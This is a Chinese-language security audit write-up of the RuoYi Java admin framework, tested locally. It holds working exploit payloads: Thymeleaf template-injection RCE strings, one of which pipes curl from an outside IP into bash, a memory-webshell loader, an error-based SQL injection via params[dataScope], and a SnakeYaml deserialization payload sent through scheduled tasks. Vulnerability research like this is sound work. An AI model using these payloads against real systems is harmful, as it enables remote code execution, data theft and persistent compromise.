# 环境搭建

Mysql: 5.7

Java8

创建ry数据库

修改数据库密码

![image-20230523095802724](images/1.png)

导入数据库文件

![image-20230523100534586](images/2.png)

两个sql都导入进去

修改http端口

![image-20230523100459484](images/3.png)

修改logback.xml中logpath

![image-20230523100724535](images/4.png)

mac中无法自动创建，所以我们自己手工创建一个logs文件夹

环境启动成功

![image-20230523100619439](images/5.png)

![image-20230523103312557](images/6.png)

默认登陆密码

# 前期准备

在审计前，还是要熟悉一下项目结构

![image-20230523101019526](images/7.png)

- ruoyi-admin	启动模块,启动配置在resource的yml下
- ruoyi-framework	主题框架模块,框架怎么运行的仔细看看,这个是核心重点
- ruoyi-system	业务模块,几乎所有业务都在这里
- ruoyi-quartz	定时任务模块,跑的定时任务基本都在这里
- ruoyi-generator	基础公共表的操作,相当于基础表和基础业务存放位置
- ruoyi-common	公共代码模块,list转set什么的一般放这里,自己不要瞎写方法,公共的都放这里

Pom.xml审计

![image-20230523103456513](images/8.png)

存在几个人去出现问题的组件，shiro，fastjson，swagger，thymeleaf，druid等，对于这种项目结构的项目，最好把每个子项目的pom文件也去翻看一遍，在子pom中，还发现了snakeyaml，版本是1.25

# 漏洞挖掘

## shiro

我们在pom文件中发现了sihro框架，版本为1.7.0，再来对照网上公布的漏洞情况来对照，在到shiro1.11.0之前都有权限绕过漏洞

![image-20230523104753509](images/9.png)

![image-20230523104813974](images/10.png)

所以这里存在shiro权限绕过漏洞，但是对于这个项目，需要具体分析

![image-20230523131411244](images/11.png)

![image-20230523110057277](images/12.png)

Shiro在1.4.2版本开始，由AES-CBC加密模式改为了AES-GCM

![image-20230523131522586](images/13.png)

对于shiro，除了AES硬编码的反序列化，还存在一堆权限绕过，在ShiroConfig中

![image-20230604121742171](images/14.png)

shiro过滤器中，anon表示匿名访问也就是无需认证即可访问，authc表示需要认证才可访问，所以我们可以看下有没有authc，是否可能存在未授权访问的问题

这里设置了全局都需要认证

```
/hello：只匹配url，比如 http://7089.com/hello
/h?：只匹配url，比如 http://7089.com/h+任意一个字符
/hello/*：匹配url下，比如 http://7089.com/hello/xxxx 的任意内容，不匹配多个路径
/hello/**：匹配url下，比如 http://7089.com/hello/xxxx/aaaa 的任意内容，匹配多个路径
```

使用了`/**`表达式，对路径进行拦截。因此，本项目**不存在**Shiro权限绕过的漏洞的

![image-20230604122210259](images/15.png)

所以没有办法去进行相应的绕过，对于1.7.0后面的漏洞，没有一个能在这里用的

## Thymeleaf模板注入

通过pom文件，我们看到了很多有问题的组件，在shiro过后，我们继续来看看这个模板渲染的组件

形成原因，简单来说，在Thymeleaf模板文件中使用th:fragment ， th:text 这类标签属性包含的内容会被渲染处理。并且在Thymeleaf渲染过程中使用 ${...} 或其他表达式中时内容会被Thymeleaf EL引擎执行。因此我们将攻击语句插入到 ${...} 表达式中，会触发Thymeleaf模板注入漏洞。

如果带有 @ResponseBody 注解和 @RestController 注解则不能触发模板注入漏洞。因为@ResponseBody 和 @RestController 不会进行View解析而是直接返回。所以这同样是修复方式

利用条件

1. 不使用`@ResponseBody`注解或者RestController注解
2. 模板名称由`redirect:`或`forward:`开头（不走ThymeleafView渲染）即无法利用
3. 参数中有`HttpServletResponse`，设置为HttpServletResponse，Spring认为它已经处理了HTTP
   Response，因此不会发生视图名称解析。

对于标签解析的话，是在springmvc中实现的，这个不需要我们去管，若依这个项目的都采用的是Controller注解，并没有用@ResponseBody，也就是说是满足我们这里的漏洞利用条件的，接下来我们就需要去找到可用的controller（即返回值可控的），因为视图解析是发生在controller之后的

我们关注两点： 

1. URL路径可控
1. return内容可控

其实了解的大概就知道，这个漏洞返回的类型基本上是string，所以我们可以用codeql先排查一部分减少工作量

```
import java

class AllControllerMethod extends Callable {
    AllControllerMethod() {
      exists(RefType i |
        i.getName()
            .substring(i.getName().indexOf("Controller"), i.getName().indexOf("Controller") + 10) =
          "Controller" and
        this = i.getACallable()
      )
    }
  }
  
  
from AllControllerMethod i
where i.getReturnType().toString() = "String"
select i.getParameter(0)
```

![image-20230604133311407](images/16.png)

类似这种可控的返回

![image-20230604133351725](images/17.png)

漏洞复现

我们用getNames这个路由，可以少传一个cacheName

![image-20230604134221454](images/18.png)

![image-20230604134430014](images/19.png)

不然put要报错，执行不到return

![image-20230604134450039](images/20.png)

类似的路由均可以触发

```
cacheName=1&fragment=%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)%7D

cacheName=1&fragment=__$%7BT(java.lang.Runtime).getRuntime().exec(%22open -a Calculator%22)%7D__::.x

cacheName=1&fragment=${T(java.lang.Runtime).getRuntime().exec("/bin/bash -c curl${IFS}47.93.248.221|bash")}

cacheName=1&fragment=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a Calculator%22).getInputStream()).next()%7d__::.x		# 正常的Thymeleaf回显payload，但是这里没办法正常回显
```

![image-20230604134720628](images/21.png)

![image-20230607233848476](images/22.png)

至于回显，可以打内存webshell，加载恶意类

```
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping)}
```

但是我没打通

不过可以参考这两篇看看加载恶意类的方式

https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/#0x03-Spring%E5%B1%82%E5%86%85%E5%AD%98%E9%A9%AC

https://forum.butian.net/share/1922

开始以为是Thymeleaf版本的问题，可能是界面是500但是不渲染到页面的原因，看不到回显，可是内存马还是没注入进去

## druid泄漏

既然是在本地测，那挂着xray的被动扫描也能帮助我们测试到更多的接口

![image-20230608111308657](images/23.png)

![image-20230608124823051](images/24.png)

正常的来说，这个页面是需要登陆的，而在我们登陆若依后，访问的时候就直接访问到了，对于swaggerui也是

![image-20230608125504836](images/25.png)

![image-20230608125628381](images/26.png)

但是确实这个没什么用，因为需要登陆到后台，只是说druid和swaggerui这两个页面其实是不允许被访问到的

## SQL注入

由于若依也是采用的mybatis这种方式去与数据库交互的，所以我们来看看xml文件里面有没有${}这种方式可以利用

![image-20230608130634711](images/27.png)

定位到了selectRoleList，我们往上面一步一步找到controller

![image-20230608130824307](images/28.png)

定位到路由/system/role/list，接受了SysRole类型的参数，最后的参数名字叫做params.dataScope

虽然SpringMVC中可以解析实体类，但是我在SysRole这个类里面没有找到这个参数，最后才看到SysRole继承了BaseEntity这个类，params参数写到了这里面

![image-20230608134344828](images/29.png)

从参数开始看，只需要传入`params[dataScope]`

```
/system/role/lists

params[dataScope]=and
 extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e))
```

![image-20230608134430922](images/30.png)



另外在/system/dept/list也是，只要通过这种思路去找就行了

用codeql实现半自动化

```
/**
 * @kind path-problem
 */
import java

class AllControllerMethod extends Callable {
    AllControllerMethod() {
      exists(RefType i |
        i.getName()
            .substring(i.getName().indexOf("Controller"), i.getName().indexOf("Controller") + 10) =
          "Controller" and
        this = i.getACallable()
      )
    }
  }

  class SqlMethod extends Call{
    SqlMethod(){
        this.getCallee().hasName("selectDeptList") or
        this.getCallee().hasName("selectRoleList")
    }
}
  
query predicate edges(Callable a, Callable b) { a.polyCalls(b) }

from AllControllerMethod start, SqlMethod end, Callable c
where edges+(start, c)
select end.getCaller(), start, end.getCaller(), "sql"
```

![image-20230608135042502](images/31.png)

## SnakeYaml

既然有这个东西，我们可以去全局搜索一下哪里有可用的Yaml.load，但是一圈搜下来，什么都没有看到

但是呢，在定时任务出，发现可以直接调用class

![image-20230615153240722](images/32.png)

最终方法的调用是在 QuartzDisallowConcurrentExecution 或QuartzJobExecution 中用JobInvokeUtil.invokeMethod(sysJob); 反射完成的

![image-20230615155238697](images/33.png)

若依支持两种方式调用，分别为支持 Bean 调用和Class 类调用。此处判断我理解为通过 beanname 判断是否为有效的classname。也就是调用目标字符串是使用 bean 方式调用，还是使用 Class 方式调用。

snakeyaml最后通过Class.forName对class进行反射调用

我们知道如果是调用class类，最终执行为 Object bean = Class.forName(beanName).newInstance(); 。 问题来了，如果此处想要成功实例化并且RCE的话，那么必须满足几个条件：

```
1、类的构造方法为Public
2、类的构造方法无参
3、调用目标字符串的参数为：支持字符串，布尔类型，长整型，浮点型，整型
4、调用目标方法除了为Public，无参，还需要具有执行代码/命令的能力
```

有的朋友一开始会想到调用 java.lang.Runtime.getRuntime().exec("") 。但经 过上面条件的梳理，发现该类不满足条件，因为他的构造方法是private。

在组件检测时发现了本项目使用了 SnakeYaml 。经过学习我们知道，该组件只要可以 控制 yaml.load() 即可触发反序列漏洞。 经过探索学习， SnakeYaml的yaml.load() 是满足以上条件的

```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager
[!!java.net.URLClassLoader [[!!java.net.URL ["ftp://cec270.dnslog.cn"]]]]')

j0ijep.dnslog.cn
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager
[!!java.net.URLClassLoader [[!!java.net.URL ["ftp://j0ijep.dnslog.cn"]]]]')
```

![image-20230615155447838](images/34.png)

至于怎么去执行的定时任务，需要对第三方组件很熟悉才，可以参考这篇

https://www.cnblogs.com/shaoqiblog/p/17305315.html

这篇文章还提到了一个任意文件下载，这个任意文件下载通过定时任务执行代码来覆盖掉本身的profile，然后在/common/download/resource截取后下载



参考链接

https://blog.csdn.net/fennyfanfan/article/details/114580665

https://www.cnblogs.com/shaoqiblog/p/17305315.html

https://xz.aliyun.com/t/11928#toc-1

https://xz.aliyun.com/t/10957#toc-5

https://blog.csdn.net/qq_44029310/article/details/125296406

https://xz.aliyun.com/t/9826

https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/#0x03-Spring%E5%B1%82%E5%86%85%E5%AD%98%E9%A9%AC

https://forum.butian.net/share/1922
